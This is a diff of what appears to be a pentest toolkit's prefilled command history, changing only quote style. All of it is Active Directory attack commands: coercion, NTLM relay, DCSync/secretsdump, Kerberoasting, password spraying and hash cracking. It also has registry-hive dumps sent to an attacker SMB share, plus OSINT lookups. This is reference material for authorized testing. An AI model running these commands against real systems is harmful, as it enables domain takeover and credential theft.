@@ -18,12 +18,12 @@ mount -o domain='BREAKING.BAD' -o username='someuser' -o password='somepassword'
 rpcdump.py DC01.BREAKING.BAD | grep -A 6 MS-RPRN
 rpcdump.py DC02.BREAKING.BAD | grep -A 6 MS-RPRN
 dementor.py -d breaking.bad -u anonymous -p anonymous 192.168.56.1 DC02.BREAKING.BAD
-printerbug.py "breaking.bad"/"anonymous":"anonymous"@"DC02.BREAKING.BAD" 192.168.56.1
+printerbug.py 'breaking.bad'/'anonymous':'anonymous'@'DC02.BREAKING.BAD' 192.168.56.1
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN 123soleil --delegate-access
 ntlmrelayx -t ldap://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
-curl --ntlm -u "someuser":"somepassword" 127.0.0.1
+curl --ntlm -u 'someuser':'somepassword' 127.0.0.1
 getST.py -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 getST.py -force-forwardable -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 -hashes :01234567890sv01nthash01234567890 BREAKING.BAD/SV01
 secretsdump -k -outputfile BREAKING.BAD DC02.BREAKING.BAD
@@ -146,7 +146,7 @@ hashcat --status --hash-type 1000 --attack-mode 0 --username BREAKING.BAD.ntds `
 hashcat --hash-type 1000 --potfile-path BREAKING.BAD.ntds.cracked BREAKING.BAD.ntds --show --username
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt --kdcHost 192.168.56.101
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting Kerberoastables.txt --kdcHost 192.168.56.101
-ldapsearch -x -h 192.168.56.101 -D '' -w '' -b "dc=BREAKING,dc=BAD"
+ldapsearch -x -h 192.168.56.101 -D '' -w '' -b 'dc=BREAKING,dc=BAD'
 addspn.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -s HOST/SHUTDOWN.BREAKING.BAD --additional DC01.BREAKING.BAD
 dnstool.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -r SHUTDOWN.BREAKING.BAD -d 192.168.56.1 --action add DC01.BREAKING.BAD
 krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab
@@ -166,8 +166,8 @@ ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u http://192.168.10.10/
 ffuf -c -w `fzf-wordlists` -e .php,.txt,.pl,.sh,.asp,.aspx,.html,.json,.py,.cfm,.rb,.cgi,.bak,.tar.gz,.tgz,.zip -u http://192.168.10.10/FUZZ
 ffuf -c -w `fzf-wordlists` -u http://192.168.10.10/FUZZ --extract-links
 ffuf -c -w `fzf-wordlists` -u http://192.168.10.10/FUZZ
-wfuzz --hh 185 -c -w `fzf-wordlists` -H "Host: FUZZ.machine.org" -u http://192.168.10.10/
-wfuzz --hh 185 -c -w `fzf-wordlists` -H "Host: FUZZ.org" -u http://192.168.10.10/
+wfuzz --hh 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u http://192.168.10.10/
+wfuzz --hh 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u http://192.168.10.10/
 evil-winrm -u serviceaccount -p P4ssw0rd -i 192.168.56.101
 evil-winrm -u serviceaccount -H c1c635aa12ae60b7fe39e28456a7bac6 -i 192.168.56.101
 cme smb 192.168.56.101 --continue-on-success -u users.txt -p passwords.txt
@@ -233,11 +233,11 @@ phoneinfoga scan -n 33123456789
 maigret user
 linkedin2username.py -u myname@email.com -c uber-com
 toutatis.py -s SESSIONID -u starbucks
-twint -u username --since "2015-12-20 20:30:15"
-twint -g="48.880048,2.385939,1km" -o file.csv --csv
+twint -u username --since '2015-12-20 20:30:15'
+twint -g='48.880048,2.385939,1km' -o file.csv --csv
 ipinfo 1.1.1.1
-onionsearch "computer"
-onionsearch "computer" --engines tor66 deeplink phobos --limit 3
+onionsearch 'computer'
+onionsearch 'computer' --engines tor66 deeplink phobos --limit 3
 waybackurls test.com
 carbon14.py http://menfous.com/
 github-email ghusername
@@ -263,8 +263,8 @@ gosecretsdump -ntds ntds.dit.save -system system.save
 screen /dev/ttyACM0 115200
 httpmethods --threads 40 --location http://www.s01.breaking.bad/
 hakrawler -url http://www.s01.breaking.bad/
-adidnsdump -u "BREAKING.BAD\someuser" -p 'somepassword' --print-zones 192.168.56.101
-proxychains adidnsdump --dns-tcp -u "BREAKING.BAD\someuser" -p 'somepassword' --print-zones 192.168.56.101
+adidnsdump -u 'BREAKING.BAD\someuser' -p 'somepassword' --print-zones 192.168.56.101
+proxychains adidnsdump --dns-tcp -u 'BREAKING.BAD\someuser' -p 'somepassword' --print-zones 192.168.56.101
 ngrok authtoken AUTHTOKEN:::https://dashboard.ngrok.com/get-started/your-authtoken
 feroxbuster -w `fzf-wordlists` -u http://192.168.10.10/
 bloodhound-import -du neo4j -dp exegol4thewin *.json
@@ -283,7 +283,7 @@ das scan -db dbname -hosts all -oA report1 -nmap '-Pn -sVC -O' -parallel
 das scan -db dbname -ports 22,80,443,445 -show
 das report -hosts 192.168.1.0/24 -oA report2
 hashcat --status --hash-type 2100 --attack-mode 0 '$DCC2$10240#user#bb38628253e7681553b72e7da3adf305' `fzf-wordlists`
-pypykatz kerberos tgt "kerberos+rc4://BREAKING.BAD\someuser:bb38628253e7681553b72e7da3adf305@domain.local"
+pypykatz kerberos tgt 'kerberos+rc4://BREAKING.BAD\someuser:bb38628253e7681553b72e7da3adf305@domain.local'
 ms14-068.py -u someuser@breaking.bad --rc4 0123456789krbtgtnthash0123456789 -s S-1-5-11-39129514-1145628974-103568174 -d dc01.breaking.bad
 getST.py -k -no-pass -spn host/dc01.breaking.bad breaking.bad/someuser
 ldapdomaindump --user 'breaking.bad\someuser' --password 'somepassword' --outdir ldapdomaindump dc01.breaking.bad
@@ -322,20 +322,19 @@ nuclei -u https://example.com
 httpx -probe -list hosts.txt -tech-detect -status-code -fr
 prips 192.168.56.1/24|hakrevdns -d|httpx -probe -tech-detect -status-code -fr
 ntpdate -u 192.168.56.101
-renameMachine.py -current-name "testcomputer$" -new-name "DC01" -dc-ip dc01 "domain"/"user1":"complexpassword"
-getTGT.py -dc-ip dc01 "domain.local"/"DC01":"123pentest"
-renameMachine.py -current-name "DC01" -new-name "testcomputer$" -dc-ip dc01 "domain"/"user1":"complexpassword"
-KRB5CCNAME="DC01.ccache" getST.py -self -impersonate "domainadmin" -spn "cifs/dc01.domain.local" -k -no-pass -dc-ip dc01 "domain.local"/"dc01"
-KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
-KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
+renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip dc01 'domain'/'user1':'complexpassword'
+getTGT.py -dc-ip dc01 'domain.local'/'DC01':'123pentest'
+renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip dc01 'domain'/'user1':'complexpassword'
+KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'domainadmin' -k -no-pass -dc-ip dc01 'domain.local'/'dc01'
+KRB5CCNAME='domainadmin.ccache' secretsdump -just-dc-user 'krbtgt' -dc-ip dc01 -k -no-pass @'dc01.domain.local'
 pwndb --target @example.com --output txt
 robotstester -u http://www.example.com/ -L
-shadowcoerce.py -d "domain" -u "user1" -p "complexpassword" 192.168.56.1 192.168.56.101
+shadowcoerce.py -d 'domain' -u 'user1' -p 'complexpassword' 192.168.56.1 192.168.56.101
 faketime '2022-01-31 22:05:35' zsh
 manspider --threads 50 192.168.56.0/24 -d BREAKING.BAD -u someuser -H bb38628253e7681553b72e7da3adf305 --content administrateur
-dcsync.py -dc "dc01.domain.local" -t "CN=someuser,OU=Users,DC=DOMAIN,DC=LOCAL" 'domain\someuser:somepassword'
-gMSADumper.py -d "domain.local" -l "dc01.domain.local" -u "someuser" -p "somepassword"
-modifyCertTemplate.py -template KerberosAuthentication -get-acl "domain.local"/"someuser":"somepassword"
+dcsync.py -dc 'dc01.domain.local' -t 'CN=someuser,OU=Users,DC=DOMAIN,DC=LOCAL' 'domain\someuser:somepassword'
+gMSADumper.py -d 'domain.local' -l 'dc01.domain.local' -u 'someuser' -p 'somepassword'
+modifyCertTemplate.py -template KerberosAuthentication -get-acl 'domain.local'/'someuser':'somepassword'
 smbserver.py -smb2support SHUTDOWN .
 reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' save -keyName 'HKLM\SAM' -o '\\192.168.56.1\SHUTDOWN'
 reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
@@ -346,8 +345,8 @@ pyLAPS.py --action get -d 'domain.local' -u 'someuser' -p 'somepassword' --dc-ip
 FindUncommonShares.py -d 'domain.local' -u 'someuser' -p 'somepassword' --dc-ip 192.168.56.101
 certipy find -u 'user@domain.local' -p 'password' -old-bloodhound
 LdapRelayScan.py -method BOTH -dc-ip 192.168.56.101 -u 'someuser' -p 'somepassword'
-goldencopy --tools all --password exegol4thewin --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 "john"
-crackhound.py --verbose --password "exegol4thewin" --plain-text --plain-text --domain "BREAKING.BAD" --file ownedusers.txt --add-password
+goldencopy --tools all --password exegol4thewin --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 'john'
+crackhound.py --verbose --password 'exegol4thewin' --plain-text --plain-text --domain 'BREAKING.BAD' --file ownedusers.txt --add-password
 kerbrute userenum -d BREAKING.BAD usernames.txt
 kerbrute passwordspray -d BREAKING.BAD domain_users.txt Password123
 kerbrute bruteuser -d BREAKING.BAD passwords.lst thoffman
